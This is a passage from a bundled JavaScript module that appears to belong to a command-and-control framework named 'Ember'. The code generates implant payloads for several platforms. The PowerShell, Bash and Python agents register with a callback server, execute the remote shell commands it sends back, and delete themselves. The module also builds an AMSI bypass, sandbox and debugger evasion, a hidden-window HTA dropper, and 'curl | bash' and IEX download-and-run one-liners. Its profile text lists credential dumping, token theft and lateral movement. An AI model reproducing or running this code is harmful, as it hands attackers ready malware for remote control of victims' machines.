1));Start-Sleep -Seconds $sleep}`;
  const encoded = Buffer.from(payload).toString("base64");
  const oneLiner = `powershell -nop -w hidden -enc ${encoded}`;
  return {
    payload: oneLiner,
    format: "powershell_oneliner",
    filename: "ember-stager.ps1",
    contentType: "text/plain",
    size: Buffer.byteLength(oneLiner),
    hash: simpleHash(oneLiner),
    oneLiner,
    capabilities: ["beacon", "shell_exec", "self_register"],
    evasionTechniques: [
      ...config.evasion.antiDebugging ? ["anti_debugging"] : [],
      ...config.evasion.sandboxDetection ? ["sandbox_detection"] : [],
      ...config.evasion.obfuscationLevel >= 3 ? ["amsi_bypass"] : [],
      "base64_encoding",
      "hidden_window"
    ],
    estimatedDetectionRate: Math.max(10, 60 - config.evasion.obfuscationLevel * 10),
    generatedAt: Date.now()
  };
}
function generatePowerShellScript(config) {
  const callbackUrl = config.callback.urls[0];
  const fallbackUrls = config.callback.urls.slice(1);
  const regToken = config.registrationToken;
  const script = `# Ember Agent \u2014 AC3 Proprietary
# Profile: ${config.profile} | Platform: ${config.platform}
# Generated: ${(/* @__PURE__ */ new Date()).toISOString()}
# Classification: PROPRIETARY \u2014 AC3 Internal Use Only

Set-StrictMode -Version Latest
$ErrorActionPreference = 'SilentlyContinue'

# \u2500\u2500\u2500 Configuration \u2500\u2500\u2500
$Config = @{
    CallbackUrls = @('${callbackUrl}'${fallbackUrls.map((u) => `, '${u}'`).join("")})
    RegistrationToken = '${regToken}'
    Profile = '${config.profile}'
    BeaconInterval = ${config.beacon.intervalSeconds}
    JitterPercent = ${config.beacon.jitterPercent}
    KillDate = ${config.beacon.killDate || 0}
    Channel = '${config.callback.primaryChannel}'
}

# \u2500\u2500\u2500 Evasion Layer \u2500\u2500\u2500
function Invoke-EvasionChecks {
    ${config.evasion.antiDebugging ? `if ([System.Diagnostics.Debugger]::IsAttached) { exit }` : "# Anti-debug disabled"}
    ${config.evasion.sandboxDetection ? `
    $mem = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    if ($mem -lt 2) { exit }
    $procs = (Get-Process).Count
    if ($procs -lt 30) { exit }
    $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    if ($uptime.TotalMinutes -lt 5) { Start-Sleep -Seconds 300 }` : "# Sandbox detection disabled"}
    ${config.evasion.obfuscationLevel >= 3 ? `
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $f = $a.GetField('amsiInitFailed', 'NonPublic,Static')
        $f.SetValue($null, $true)
    } catch {}` : "# AMSI bypass disabled"}
}

# \u2500\u2500\u2500 System Enumeration \u2500\u2500\u2500
function Get-SystemInfo {
    @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        domain = $env:USERDOMAIN
        platform = 'windows'
        architecture = if ([Environment]::Is64BitOperatingSystem) { 'x64' } else { 'x86' }
        osVersion = [System.Environment]::OSVersion.VersionString
        pid = $PID
        processName = (Get-Process -Id $PID).ProcessName
        isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        integrity = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 'high' } else { 'medium' }
        networkInterfaces = @(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | ForEach-Object {
            @{ name = $_.InterfaceAlias; ipv4 = $_.IPAddress; mac = (Get-NetAdapter -InterfaceIndex $_.InterfaceIndex).MacAddress }
        })
        securityProducts = @(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue | ForEach-Object {
            @{ name = $_.displayName; type = 'av'; running = $true }
        })
    }
}

# \u2500\u2500\u2500 Beacon Loop \u2500\u2500\u2500
function Start-EmberBeacon {
    Invoke-EvasionChecks
    ${config.evasion.initialSleepMs > 0 ? `Start-Sleep -Milliseconds ${config.evasion.initialSleepMs}` : ""}

    $sysInfo = Get-SystemInfo
    $agentId = [guid]::NewGuid().ToString()
    $sequence = 0
    $currentUrlIdx = 0

    # Register
    $regBody = @{
        agentId = $agentId
        name = "ember-$($sysInfo.hostname)"
        token = $Config.RegistrationToken
        systemInfo = $sysInfo
        profile = $Config.Profile
        interval = $Config.BeaconInterval
        jitter = $Config.JitterPercent
    } | ConvertTo-Json -Depth 5

    $registered = $false
    foreach ($url in $Config.CallbackUrls) {
        try {
            $reg = Invoke-RestMethod -Uri "$url/api/ember/register" -Method POST -Body $regBody -ContentType 'application/json' -TimeoutSec 30
            if ($reg.agentId) { $registered = $true; $currentUrlIdx = $Config.CallbackUrls.IndexOf($url); break }
        } catch { continue }
    }
    if (-not $registered) { exit }

    # Main beacon loop
    while ($true) {
        if ($Config.KillDate -gt 0 -and [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() -gt $Config.KillDate) {
            # Self-destruct
            Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
            exit
        }

        $sequence++
        $beaconBody = @{
            agentId = $agentId
            sequence = $sequence
            state = 'active'
            timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
            channel = $Config.Channel
            systemInfo = $sysInfo
        } | ConvertTo-Json -Depth 5

        try {
            $url = $Config.CallbackUrls[$currentUrlIdx]
            $resp = Invoke-RestMethod -Uri "$url/api/ember/beacon" -Method POST -Body $beaconBody -ContentType 'application/json' -TimeoutSec 30

            if ($resp.tasks) {
                foreach ($task in $resp.tasks) {
                    $result = @{ taskId = $task.taskId; agentId = $agentId; status = 'failed'; output = ''; error = '' }
                    try {
                        switch ($task.type) {
                            'shell_command' {
                                $out = Invoke-Expression $task.params.command 2>&1 | Out-String
                                $result.status = 'success'
                                $result.output = $out
                            }
                            'sleep_update' {
                                $Config.BeaconInterval = $task.params.interval
                                $Config.JitterPercent = $task.params.jitter
                                $result.status = 'success'
                                $result.output = "Beacon updated: interval=$($task.params.interval)s jitter=$($task.params.jitter)%"
                            }
                            'self_destruct' {
                                Invoke-RestMethod -Uri "$url/api/ember/result" -Method POST -Body ($result | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10
                                Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
                                exit
                            }
                            default {
                                $result.output = "Unsupported task type: $($task.type)"
                            }
                        }
                    } catch {
                        $result.error = $_.Exception.Message
                    }
                    Invoke-RestMethod -Uri "$url/api/ember/result" -Method POST -Body ($result | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10
                }
            }
        } catch {
            # Channel failure \u2014 try next URL
            $currentUrlIdx = ($currentUrlIdx + 1) % $Config.CallbackUrls.Count
        }

        # Jittered sleep
        $jitterRange = [int]($Config.BeaconInterval * $Config.JitterPercent / 100)
        $sleep = $Config.BeaconInterval + (Get-Random -Minimum (-$jitterRange) -Maximum $jitterRange)
        if ($sleep -lt 1) { $sleep = 1 }
        Start-Sleep -Seconds $sleep
    }
}

Start-EmberBeacon
`;
  return {
    payload: script,
    format: "powershell_script",
    filename: `ember-${config.profile}-${Date.now().toString(36)}.ps1`,
    contentType: "text/plain",
    size: Buffer.byteLength(script),
    hash: simpleHash(script),
    oneLiner: `powershell -nop -w hidden -ep bypass -f .\\ember-${config.profile}.ps1`,
    capabilities: ["beacon", "shell_exec", "self_register", "kill_date", "channel_failover", "system_enum"],
    evasionTechniques: [
      ...config.evasion.antiDebugging ? ["anti_debugging"] : [],
      ...config.evasion.sandboxDetection ? ["sandbox_detection", "uptime_check", "process_count_check"] : [],
      ...config.evasion.obfuscationLevel >= 3 ? ["amsi_bypass"] : [],
      "jittered_beacon",
      "multi_callback_failover"
    ],
    estimatedDetectionRate: Math.max(5, 50 - config.evasion.obfuscationLevel * 8),
    generatedAt: Date.now()
  };
}
function generateBashOneLiner(config) {
  const callbackUrl = config.callback.urls[0];
  const regToken = config.registrationToken;
  const interval = config.beacon.intervalSeconds;
  const jitter = config.beacon.jitterPercent;
  const sandboxCheck = config.evasion.sandboxDetection ? `[ $(nproc) -lt 2 ] && exit; [ $(cat /proc/meminfo | grep MemTotal | awk '{print $2}') -lt 1000000 ] && exit;` : "";
  const payload = `${sandboxCheck}(C="${callbackUrl}";T="${regToken}";I=${interval};J=${jitter};H=$(hostname);U=$(whoami);A=$(uuidgen 2>/dev/null||cat /proc/sys/kernel/random/uuid);curl -s -X POST "$C/api/ember/register" -H 'Content-Type: application/json' -d "{\\"agentId\\":\\"$A\\",\\"name\\":\\"ember-$H\\",\\"token\\":\\"$T\\",\\"hostname\\":\\"$H\\",\\"username\\":\\"$U\\",\\"platform\\":\\"linux\\",\\"profile\\":\\"${config.profile}\\"}";while true;do R=$(curl -s -X POST "$C/api/ember/beacon" -H 'Content-Type: application/json' -d "{\\"agentId\\":\\"$A\\",\\"state\\":\\"active\\",\\"timestamp\\":$(date +%s%3N)}");echo "$R"|python3 -c "import sys,json;[__import__('subprocess').run(t['params'].get('command',''),shell=True,capture_output=True) for t in json.load(sys.stdin).get('tasks',[])]" 2>/dev/null;S=$((I+RANDOM%((I*J/50))-I*J/100));sleep $S;done)&`;
  return {
    payload,
    format: "bash_oneliner",
    filename: "ember-stager.sh",
    contentType: "text/plain",
    size: Buffer.byteLength(payload),
    hash: simpleHash(payload),
    oneLiner: `bash -c '\${payload.replace(/'/g, "'\\''")}'`,
    capabilities: ["beacon", "shell_exec", "self_register", "background_exec"],
    evasionTechniques: [
      ...config.evasion.sandboxDetection ? ["sandbox_detection"] : [],
      "background_process",
      "jittered_beacon"
    ],
    estimatedDetectionRate: Math.max(15, 55 - config.evasion.obfuscationLevel * 8),
    generatedAt: Date.now()
  };
}
function generateBashScript(config) {
  const callbackUrl = config.callback.urls[0];
  const fallbackUrls = config.callback.urls.slice(1);
  const script = `#!/bin/bash
# Ember Agent \u2014 AC3 Proprietary
# Profile: ${config.profile} | Platform: ${config.platform}
# Generated: ${(/* @__PURE__ */ new Date()).toISOString()}
# Classification: PROPRIETARY \u2014 AC3 Internal Use Only

set -euo pipefail

# \u2500\u2500\u2500 Configuration \u2500\u2500\u2500
CALLBACK_URLS=("${callbackUrl}"${fallbackUrls.map((u) => ` "\${u}"`).join("")})
REG_TOKEN="${config.registrationToken}"
PROFILE="${config.profile}"
BEACON_INTERVAL=${config.beacon.intervalSeconds}
JITTER_PERCENT=${config.beacon.jitterPercent}
KILL_DATE=${config.beacon.killDate || 0}
CURRENT_URL_IDX=0

# \u2500\u2500\u2500 Evasion Checks \u2500\u2500\u2500
${config.evasion.sandboxDetection ? `
check_sandbox() {
    local mem_kb=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')
    [ "\${mem_kb:-0}" -lt 1000000 ] && exit 0
    local cpu_count=$(nproc 2>/dev/null || echo 1)
    [ "$cpu_count" -lt 2 ] && exit 0
    local uptime_sec=$(awk '{print int($1)}' /proc/uptime 2>/dev/null || echo 999)
    [ "$uptime_sec" -lt 300 ] && sleep 300
}
check_sandbox` : "# Sandbox detection disabled"}

${config.evasion.antiDebugging ? `
check_debugger() {
    if grep -q TracerPid /proc/self/status 2>/dev/null; then
        local tracer=$(grep TracerPid /proc/self/status | awk '{print $2}')
        [ "$tracer" -ne 0 ] && exit 0
    fi
}
check_debugger` : "# Anti-debug disabled"}

# \u2500\u2500\u2500 System Enumeration \u2500\u2500\u2500
get_system_info() {
    local hostname=$(hostname)
    local username=$(whoami)
    local platform="linux"
    local arch=$(uname -m)
    local os_version=$(uname -r)
    local pid=$$
    local process_name=$(basename "$0")
    local is_elevated=false
    [ "$(id -u)" -eq 0 ] && is_elevated=true

    cat <<EOF
{
    "hostname": "$hostname",
    "username": "$username",
    "platform": "$platform",
    "architecture": "$arch",
    "osVersion": "$os_version",
    "pid": $pid,
    "processName": "$process_name",
    "isElevated": $is_elevated,
    "integrity": "$([ "$(id -u)" -eq 0 ] && echo 'high' || echo 'medium')",
    "networkInterfaces": [$(ip -4 addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print "{\\"name\\": \\""$NF"\\", \\"ipv4\\": \\""$2"\\"}" }' | paste -sd, || echo '')]
}
EOF
}

# \u2500\u2500\u2500 Beacon Functions \u2500\u2500\u2500
AGENT_ID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || echo "ember-$(date +%s)-$$")
SEQUENCE=0

http_post() {
    local url="$1" data="$2"
    curl -s -X POST "$url" -H 'Content-Type: application/json' -d "$data" --connect-timeout 10 --max-time 30 2>/dev/null
}

register_agent() {
    local sys_info=$(get_system_info)
    local body="{\\"agentId\\":\\"$AGENT_ID\\",\\"name\\":\\"ember-$(hostname)\\",\\"token\\":\\"$REG_TOKEN\\",\\"profile\\":\\"$PROFILE\\",\\"interval\\":$BEACON_INTERVAL,\\"jitter\\":$JITTER_PERCENT,\\"systemInfo\\":$sys_info}"

    for i in "\${!CALLBACK_URLS[@]}"; do
        local resp=$(http_post "\${CALLBACK_URLS[$i]}/api/ember/register" "$body")
        if echo "$resp" | grep -q "agentId"; then
            CURRENT_URL_IDX=$i
            return 0
        fi
    done
    return 1
}

send_beacon() {
    SEQUENCE=$((SEQUENCE + 1))
    local ts=$(date +%s%3N 2>/dev/null || echo $(($(date +%s) * 1000)))
    local body="{\\"agentId\\":\\"$AGENT_ID\\",\\"sequence\\":$SEQUENCE,\\"state\\":\\"active\\",\\"timestamp\\":$ts,\\"channel\\":\\"https_beacon\\"}"
    local url="\${CALLBACK_URLS[$CURRENT_URL_IDX]}"
    http_post "$url/api/ember/beacon" "$body"
}

execute_task() {
    local task_json="$1"
    local task_id=$(echo "$task_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('taskId',''))" 2>/dev/null)
    local task_type=$(echo "$task_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('type',''))" 2>/dev/null)
    local output="" status="failed" error=""

    case "$task_type" in
        shell_command)
            local cmd=$(echo "$task_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('params',{}).get('command',''))" 2>/dev/null)
            output=$(eval "$cmd" 2>&1) && status="success" || error="Command failed"
            ;;
        sleep_update)
            BEACON_INTERVAL=$(echo "$task_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('params',{}).get('interval',$BEACON_INTERVAL))" 2>/dev/null)
            JITTER_PERCENT=$(echo "$task_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('params',{}).get('jitter',$JITTER_PERCENT))" 2>/dev/null)
            status="success"
            output="Beacon updated: interval=\${BEACON_INTERVAL}s jitter=\${JITTER_PERCENT}%"
            ;;
        self_destruct)
            rm -f "$0" 2>/dev/null
            exit 0
            ;;
        *)
            output="Unsupported task type: $task_type"
            ;;
    esac

    local url="\${CALLBACK_URLS[$CURRENT_URL_IDX]}"
    local result="{\\"taskId\\":\\"$task_id\\",\\"agentId\\":\\"$AGENT_ID\\",\\"status\\":\\"$status\\",\\"output\\":\\"$(echo "$output" | head -c 4000 | sed 's/"/\\\\"/g; s/$/\\\\n/' | tr -d '\\n')\\"}"
    http_post "$url/api/ember/result" "$result"
}

# \u2500\u2500\u2500 Main Loop \u2500\u2500\u2500
${config.evasion.initialSleepMs > 0 ? `sleep $((${config.evasion.initialSleepMs} / 1000))` : ""}

register_agent || exit 1

while true; do
    # Kill date check
    if [ $KILL_DATE -gt 0 ]; then
        local now_ms=$(date +%s%3N 2>/dev/null || echo $(($(date +%s) * 1000)))
        [ "$now_ms" -gt "$KILL_DATE" ] && rm -f "$0" 2>/dev/null && exit 0
    fi

    resp=$(send_beacon)

    # Process tasks
    if echo "$resp" | python3 -c "import sys,json;d=json.load(sys.stdin);exit(0 if d.get('tasks') else 1)" 2>/dev/null; then
        echo "$resp" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for task in data.get('tasks', []):
    print(json.dumps(task))
" 2>/dev/null | while read -r task_line; do
            execute_task "$task_line"
        done
    fi

    # Jittered sleep
    jitter_range=$((BEACON_INTERVAL * JITTER_PERCENT / 100))
    [ "$jitter_range" -lt 1 ] && jitter_range=1
    sleep_time=$((BEACON_INTERVAL + RANDOM % (jitter_range * 2) - jitter_range))
    [ "$sleep_time" -lt 1 ] && sleep_time=1
    sleep "$sleep_time"
done
`;
  return {
    payload: script,
    format: "bash_script",
    filename: `ember-${config.profile}-\${Date.now().toString(36)}.sh`,
    contentType: "text/plain",
    size: Buffer.byteLength(script),
    hash: simpleHash(script),
    oneLiner: `curl -s ${callbackUrl}/api/ember/payload/${config.registrationToken} | bash`,
    capabilities: ["beacon", "shell_exec", "self_register", "kill_date", "channel_failover", "system_enum"],
    evasionTechniques: [
      ...config.evasion.sandboxDetection ? ["sandbox_detection", "memory_check", "cpu_check"] : [],
      ...config.evasion.antiDebugging ? ["ptrace_check"] : [],
      "jittered_beacon",
      "multi_callback_failover"
    ],
    estimatedDetectionRate: Math.max(5, 45 - config.evasion.obfuscationLevel * 7),
    generatedAt: Date.now()
  };
}
function generatePythonStager(config) {
  const callbackUrl = config.callback.urls[0];
  const script = `#!/usr/bin/env python3
# Ember Agent \u2014 AC3 Proprietary
# Profile: ${config.profile} | Platform: ${config.platform}
import os,sys,json,time,uuid,socket,platform,subprocess,urllib.request,urllib.error

C="${callbackUrl}"
T="${config.registrationToken}"
I=${config.beacon.intervalSeconds}
J=${config.beacon.jitterPercent}
P="${config.profile}"

def sysinfo():
    return {"hostname":socket.gethostname(),"username":os.getenv("USER",os.getenv("USERNAME","unknown")),"platform":sys.platform,"architecture":platform.machine(),"osVersion":platform.release(),"pid":os.getpid(),"processName":sys.argv[0],"isElevated":os.getuid()==0 if hasattr(os,"getuid") else False,"integrity":"high" if (hasattr(os,"getuid") and os.getuid()==0) else "medium","networkInterfaces":[],"securityProducts":[]}

def post(url,data):
    req=urllib.request.Request(url,json.dumps(data).encode(),{"Content-Type":"application/json"})
    try:
        with urllib.request.urlopen(req,timeout=30) as r:return json.loads(r.read())
    except:return{}

aid=str(uuid.uuid4())
si=sysinfo()
post(f"{C}/api/ember/register",{"agentId":aid,"name":f"ember-{si['hostname']}","token":T,"profile":P,"interval":I,"jitter":J,"systemInfo":si})
seq=0
while True:
    seq+=1
    try:
        r=post(f"{C}/api/ember/beacon",{"agentId":aid,"sequence":seq,"state":"active","timestamp":int(time.time()*1000),"channel":"https_beacon"})
        for t in r.get("tasks",[]):
            tid,tp=t["taskId"],t["type"]
            out,st,err="","failed",""
            try:
                if tp=="shell_command":
                    p=subprocess.run(t["params"]["command"],shell=True,capture_output=True,text=True,timeout=300)
                    out,st=p.stdout+p.stderr,"success"
                elif tp=="self_destruct":
                    try:os.remove(__file__)
                    except:pass
                    sys.exit(0)
                elif tp=="sleep_update":
                    I,J=t["params"].get("interval",I),t["params"].get("jitter",J)
                    st,out="success",f"Updated: interval={I}s jitter={J}%"
            except Exception as e:err=str(e)
            post(f"{C}/api/ember/result",{"taskId":tid,"agentId":aid,"status":st,"output":out[:4000],"error":err})
    except:pass
    import random;time.sleep(max(1,I+random.randint(-I*J//100,I*J//100)))
`;
  return {
    payload: script,
    format: "python_stager",
    filename: `ember-${config.profile}-${Date.now().toString(36)}.py`,
    contentType: "text/x-python",
    size: Buffer.byteLength(script),
    hash: simpleHash(script),
    oneLiner: `python3 -c "$(curl -s ${callbackUrl}/api/ember/payload/${config.registrationToken})"`,
    capabilities: ["beacon", "shell_exec", "self_register", "cross_platform"],
    evasionTechniques: ["jittered_beacon", "no_external_dependencies"],
    estimatedDetectionRate: Math.max(10, 40 - config.evasion.obfuscationLevel * 6),
    generatedAt: Date.now()
  };
}
function generateDLLStub(config) {
  return createStubOutput(
    config,
    "dll_sideload",
    "ember-sideload.dll",
    "application/x-msdownload",
    ["dll_sideload", "process_injection"],
    ["dll_sideloading", "export_forwarding"]
  );
}
function generateMSIStub(config) {
  return createStubOutput(
    config,
    "msi_installer",
    "ember-installer.msi",
    "application/x-msi",
    ["msi_install", "service_persistence"],
    ["signed_package", "custom_action"]
  );
}
function generateHTADropper(config) {
  const callbackUrl = config.callback.urls[0];
  const hta = `<html><head><HTA:APPLICATION ID="Ember" APPLICATIONNAME="System Update" SHOWINTASKBAR="no" WINDOWSTATE="minimize"/></head><body><script language="VBScript">
Set s=CreateObject("WScript.Shell"):s.Run "powershell -nop -w hidden -enc ${Buffer.from(`IEX(IWR '${callbackUrl}/api/ember/payload/${config.registrationToken}' -UseBasicParsing).Content`).toString("base64")}",0:Close
</script></body></html>`;
  return {
    payload: hta,
    format: "hta_dropper",
    filename: `system-update-${Date.now().toString(36)}.hta`,
    contentType: "application/hta",
    size: Buffer.byteLength(hta),
    hash: simpleHash(hta),
    capabilities: ["dropper", "powershell_exec"],
    evasionTechniques: ["hta_execution", "hidden_window", "encoded_payload"],
    estimatedDetectionRate: 45,
    generatedAt: Date.now()
  };
}
function generateMacroStub(config) {
  return createStubOutput(
    config,
    "macro_document",
    "ember-doc.docm",
    "application/vnd.ms-word.document.macroEnabled.12",
    ["macro_exec", "dropper"],
    ["auto_open_macro", "obfuscated_vba"]
  );
}
function generateISOStub(config) {
  return createStubOutput(
    config,
    "iso_container",
    "ember-archive.iso",
    "application/x-iso9660-image",
    ["iso_mount", "lnk_exec"],
    ["motw_bypass", "hidden_files"]
  );
}
function generateLNKStub(config) {
  return createStubOutput(
    config,
    "lnk_shortcut",
    "Document.lnk",
    "application/x-ms-shortcut",
    ["lnk_exec", "powershell_exec"],
    ["icon_masquerade", "hidden_args"]
  );
}
function generateServiceExeStub(config) {
  return createStubOutput(
    config,
    "service_executable",
    "ember-svc.exe",
    "application/x-msdownload",
    ["service_install", "persistence", "beacon"],
    ["service_masquerade", "signed_binary"]
  );
}
function generateELFStub(config) {
  return createStubOutput(
    config,
    "elf_binary",
    "ember-agent",
    "application/x-executable",
    ["beacon", "shell_exec", "persistence"],
    ["stripped_binary", "anti_debug", "ptrace_check"]
  );
}
function generateShellcodeStub(config) {
  return createStubOutput(
    config,
    "shellcode_raw",
    "ember-shellcode.bin",
    "application/octet-stream",
    ["shellcode_inject", "pic_exec"],
    ["position_independent", "null_free", "xor_encoded"]
  );
}
function generateBOFStub(config) {
  return createStubOutput(
    config,
    "bof_module",
    "ember-module.o",
    "application/octet-stream",
    ["bof_exec", "in_process"],
    ["coff_object", "no_new_process"]
  );
}
function createStubOutput(config, format, filename, contentType, capabilities, evasionTechniques) {
  const stub = `[Ember ${format} payload \u2014 requires compilation pipeline]
Profile: ${config.profile}
Platform: ${config.platform}
Callback: ${config.callback.urls[0]}
Generated: ${(/* @__PURE__ */ new Date()).toISOString()}`;
  return {
    payload: stub,
    format,
    filename,
    contentType,
    size: Buffer.byteLength(stub),
    hash: simpleHash(stub),
    capabilities,
    evasionTechniques,
    estimatedDetectionRate: Math.max(5, 30 - config.evasion.obfuscationLevel * 5),
    generatedAt: Date.now()
  };
}
function simpleHash(input) {
  let hash = 0;
  for (let i = 0; i < input.length; i++) {
    const char = input.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash |= 0;
  }
  return Math.abs(hash).toString(16).padStart(16, "0");
}
var _manager = null;
function getEmberAgentManager() {
  if (!_manager) _manager = new EmberAgentManager();
  return _manager;
}
function resetEmberAgentManager() {
  _manager = null;
}
var EMBER_PROFILE_DESCRIPTIONS = {
  ghost: {
    label: "Ghost",
    description: "Minimal footprint beacon-only agent. Maximum evasion with no offensive tools. Ideal for long-term persistent access and monitoring.",
    capabilities: ["beacon", "system_enum", "channel_switch"],
    stealthRating: 95,
    footprintKb: 8
  },
  scout: {
    label: "Scout",
    description: "Reconnaissance-focused agent with passive and active network mapping. Discovers hosts, services, and attack surface without exploitation.",
    capabilities: ["beacon", "system_enum", "network_map", "service_fingerprint", "ad_enum", "cloud_metadata"],
    stealthRating: 80,
    footprintKb: 24
  },
  striker: {
    label: "Striker",
    description: "Full offensive toolkit for exploitation, credential access, and post-exploitation. Designed for active red team operations.",
    capabilities: ["beacon", "system_enum", "shell_exec", "file_ops", "cred_dump", "token_theft", "process_inject", "privesc", "lateral_move"],
    stealthRating: 50,
    footprintKb: 64
  },
  sentinel: {
    label: "Sentinel",
    description: "Long-term persistence agent with multiple persistence mechanisms and self-healing. Maintains access across reboots and updates.",
    capabilities: ["beacon", "system_enum", "persistence", "self_heal", "watchdog", "update"],
    stealthRating: 85,
    footprintKb: 32
  },
  hydra: {
    label: "Hydra",
    description: "Swarm coordination node that manages multi-agent operations. Distributes tasks, shares intelligence, and coordinates collective evasion.",
    capabilities: ["beacon", "system_enum", "swarm_coord", "p2p_mesh", "task_distribute", "intel_share", "collective_evasion"],
    stealthRating: 70,
    footprintKb: 48
  }
};
var EMBER_CHANNEL_DESCRIPTIONS = {
  https_beacon: {
    label: "HTTPS Beacon",
    description: "Standard HTTPS communication with malleable traffic profiles. Blends with normal web traffic.",
    stealthRating: 70,
    bandwidth: "high",
    latency: "low",
    reliability: 95
  },
  dns_covert: {
    label: "DNS Covert Channel",
    description: "Encodes data in DNS queries and responses. Very stealthy but low bandwidth.",
    stealthRating: 90,
    bandwidth: "low",
    latency: "high",
    reliability: 85
  },
  doh_tunnel: {
    label: "DNS-over-HTTPS Tunnel",
    description: "Tunnels data through DNS-over-HTTPS requests to public resolvers. Appears as legitimate encrypted DNS.",
    stealthRating: 95,
    bandwidth: "low",
    latency: "medium",
    reliability: 90
  },
  websocket_stream: {
    label: "WebSocket Stream",
    description: "Persistent WebSocket connection for real-time interactive sessions. High bandwidth but more detectable.",
    stealthRating: 60,
    bandwidth: "high",
    latency: "low",
    reliability: 80
  },
  icmp_covert: {
    label: "ICMP Covert Channel",
    description: "Hides data in ICMP echo request/reply payloads. Bypasses many firewalls.",
    stealthRating: 75,
    bandwidth: "low",
    latency: "medium",
    reliability: 70
  },
  smb_named_pipe: {
    label: "SMB Named Pipe",
    description: "Uses SMB named pipes for internal lateral communication. Blends with Windows domain traffic.",
    stealthRating: 80,
    bandwidth: "medium",
    latency: "low",
    reliability: 85
  },
  steganography: {
    label: "Steganographic Channel",
    description: "Embeds data in images uploaded/downloaded from legitimate services. Extremely stealthy.",
    stealthRating: 98,
    bandwidth: "low",
    latency: "high",
    reliability: 75
  },
  p2p_mesh: {
    label: "P2P Mesh Network",
    description: "Peer-to-peer communication between Ember agents. No direct C2 contact needed for interior agents.",
    stealthRating: 85,
    bandwidth: "medium",
    latency: "medium",
    reliability: 80
  }
};

export {
  EMBER_VERSION,
  EMBER_CODENAME,
  EMBER_AGENT_TYPE,
  EMBER_CAPABILITY_CATALOG,
  EmberCognitiveCore,
  EMBER_TRAFFIC_PROFILES,
  EmberAgentManager,
  generateEmberPayload,
  getEmberAgentManager,
  resetEmberAgentManager,
  EMBER_PROFILE_DESCRIPTIONS,
  EMBER_CHANNEL_DESCRIPTIONS
};
